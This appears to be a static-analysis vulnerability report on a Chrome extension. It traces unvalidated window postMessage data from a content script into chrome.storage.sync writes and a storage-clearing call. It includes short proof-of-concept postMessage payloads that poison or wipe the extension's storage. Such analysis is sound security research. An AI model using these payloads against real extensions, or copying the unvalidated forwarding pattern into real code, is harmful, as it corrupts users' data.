# CoCo Analysis: ghjjkjiibfblgoedjefjbllppdihlfca

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8 unique flows + 1 chrome_storage_sync_clear_sink

---

## Sink: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ghjjkjiibfblgoedjefjbllppdihlfca/opgen_generated_files/cs_0.js
Line 519 - window.addEventListener('message', function(event) {
Line 525 - var strPlayerKey = event.data.playerkey;
Line 526 - var strAvailability = event.data.availability;
Line 527 - var strAction = event.data.action;

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener('message', function(event) { // ← Attacker-controlled via webpage postMessage
  var strPlayerKey = event.data.playerkey; // ← Attacker-controlled
  var strAvailability = event.data.availability; // ← Attacker-controlled
  var strAction = event.data.action; // ← Attacker-controlled

  chrome.runtime.sendMessage(event.data, function(response) { // ← Sends attacker data to background
  });
});

// Background script (bg.js) - Message handler - Line 2226-2248
chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    if (request.action == "add") {
      chrome.storage.sync.set({"playertoadd" : request}, function(data) { // ← Storage sink
        getRoster();
      }.bind(this));
    }
    else if (request.action == "drop") {
      chrome.storage.sync.set({"playertodrop" : request}, function(data) { // ← Storage sink
        addAndDrop();
      }.bind(this));
    }
    else if (request.action == "clearall") {
      clearAllData(); // ← Clears storage
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Malicious webpage can poison the extension's storage
window.postMessage({
  action: "add",
  playerkey: "malicious_player_id",
  availability: "malicious_data",
  // Any other fields the attacker wants to inject
}, "*");

// Or trigger storage clearing
window.postMessage({
  action: "clearall"
}, "*");

// Or poison drop data
window.postMessage({
  action: "drop",
  playerkey: "malicious_drop_id"
}, "*");
```

**Impact:** Storage poisoning vulnerability. A malicious webpage can inject arbitrary data into the extension's chrome.storage.sync by sending postMessage events. The extension listens for window messages in the content script and forwards all event.data directly to the background script without validation. The background script then stores this attacker-controlled data in chrome.storage.sync under "playertoadd" or "playertodrop" keys, or can trigger clearAllData() to wipe extension storage. While this is storage poisoning without a confirmed retrieval path back to the attacker in the visible code, the stored data is used by getRoster() and addAndDrop() functions which could lead to further exploitation depending on how those functions use the poisoned data. The attacker achieves complete control over the extension's player management storage.
